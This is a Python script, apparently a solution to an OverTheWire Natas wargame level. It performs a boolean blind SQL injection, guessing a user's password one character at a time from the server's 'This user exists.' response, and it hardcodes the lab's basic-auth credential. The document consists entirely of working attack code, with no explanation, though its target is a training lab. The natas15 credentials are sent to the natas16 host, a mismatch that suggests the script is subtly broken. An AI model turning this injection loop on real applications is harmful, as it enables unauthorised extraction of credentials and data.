import requests
import string
from requests.auth import HTTPBasicAuth

basicAuth = HTTPBasicAuth("natas15", "GB6USCJYJjwLyYhZUNkE1NwDueiTow6g")
headers = {"Content-Type": "application/x-www-form-urlencoded"}


u = "http://natas16.natas.labs.overthewire.org/index.php?debug"

password = ""
PASSWORD_LENGTH = 32
VALID_CHARS = string.digits + string.ascii_letters

count = 1

while count <= PASSWORD_LENGTH:
    found = False

    for c in VALID_CHARS:
        payload = (
            "username=natas16"
            + '" AND '
            + "BINARY substring(password,1,"
            + str(count)
            + ")"
            + " = '"
            + password
            + c
            + "'"
            + " -- "
        )

        response = requests.post(u, data=payload, headers=headers, auth=basicAuth)

        if "This user exists." in response.text:
            password += c
            print(f"Found character {count}: {c}")
            print(f"Current password: {password}")

            found = True
            print(f" this is the password do far : {password}")
            break
        # print(response.text)

    if not found:
        print(f"No matching character found at position {count}")
        break

    count += 1


print("Done!")
